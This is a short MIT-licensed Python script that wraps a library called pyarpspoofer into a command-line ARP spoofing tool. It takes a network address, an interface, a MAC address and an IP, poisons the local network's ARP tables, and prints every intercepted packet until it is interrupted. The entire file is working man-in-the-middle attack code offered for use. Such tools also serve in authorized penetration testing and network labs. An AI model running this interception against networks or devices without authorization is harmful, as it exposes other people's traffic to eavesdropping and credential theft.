"""
MIT License

Copyright (c) 2018 Jacob Hartman

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""
from pyarpspoofer import ArpSpoofer

import argparse
import sys 
import signal
import time

parser = argparse.ArgumentParser(description='Scriptable ARP Spoofing')
parser.add_argument('--network_address', '-n', help='The network address')
parser.add_argument('--interface', '-i', help='The interface to use')
parser.add_argument('--mac', '-m', help='The MAC to spoof (usually our MAC)')
parser.add_argument('--ip', '-p', help='The IP to use (usually our IP)')

args = parser.parse_args()

if args.network_address == None:
    print("No network set")
    sys.exit(1)

if args.interface == None:
    print("No interface set")
    sys.exit(1)

if args.mac == None:
    print("No mac set")
    sys.exit(1)

if args.ip == None:
    print("No ip set")
    sys.exit(1)

spoofer = ArpSpoofer(args.network_address, args.interface, args.mac, args.ip)

def signal_handler(signal, frame):
    print("")
    spoofer.stop_spoof()
    sys.exit(1)
    

    
signal.signal(signal.SIGINT, signal_handler)

def print_pkt(pkt):
    pkt.show()
    return pkt

spoofer.start_spoof(on_packet=print_pkt)

while True:
    time.sleep(3)